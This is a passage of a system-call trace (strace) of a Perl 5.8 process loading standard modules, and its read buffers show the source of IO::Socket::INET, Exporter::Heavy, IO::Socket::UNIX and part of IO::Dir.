12268 07:41:34.925186 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.925199 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.925211 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.925225 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.925238 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
12268 07:41:34.925259 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
12268 07:41:34.925273 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c0438) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.925285 _llseek(6, 0, [0], SEEK_CUR) = 0
12268 07:41:34.925302 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
12268 07:41:34.925710 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.925726 stat64("/etc/perl/Exporter/Heavy.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.925740 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.925752 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.925769 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.925782 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.925796 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.925808 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.925822 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.925834 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.925847 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.925860 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.925873 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.925912 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
12268 07:41:34.925936 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
12268 07:41:34.925965 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9bff88) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.925976 _llseek(8, 0, [0], SEEK_CUR) = 0
12268 07:41:34.925994 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
12268 07:41:34.926736 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
12268 07:41:34.927094 brk(0x829c000)    = 0x829c000
12268 07:41:34.927348 read(8, "", 4096) = 0
12268 07:41:34.927364 close(8)          = 0
12268 07:41:34.928519 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
12268 07:41:34.928889 _llseek(6, 6496, [6496], SEEK_SET) = 0
12268 07:41:34.928905 _llseek(6, 0, [6496], SEEK_CUR) = 0
12268 07:41:34.928915 close(6)          = 0
12268 07:41:34.929020 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.929038 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.929052 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.929066 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.929080 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.929094 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.929108 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.929121 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.929139 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.929151 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.929165 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.929178 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
12268 07:41:34.929200 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
12268 07:41:34.929215 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c0438) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.929227 _llseek(6, 0, [0], SEEK_CUR) = 0
12268 07:41:34.929243 brk(0x82bd000)    = 0x82bd000
12268 07:41:34.929260 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
12268 07:41:34.930172 _llseek(6, 1386, [1386], SEEK_SET) = 0
12268 07:41:34.952520 _llseek(6, 0, [1386], SEEK_CUR) = 0
12268 07:41:34.952536 close(6)          = 0
12268 07:41:34.952615 stat64("/etc/perl/IO/Dir.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.952632 stat64("/etc/perl/IO/Dir.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.952645 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.952659 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.952672 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.952685 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.952698 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.952710 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.952723 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.952735 stat64("/usr/share/perl5/IO/Dir.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.952748 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.952762 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
12268 07:41:34.952783 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
12268 07:41:34.952798 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c0438) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.952815 _llseek(6, 0, [0], SEEK_CUR) = 0
12268 07:41:34.952836 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 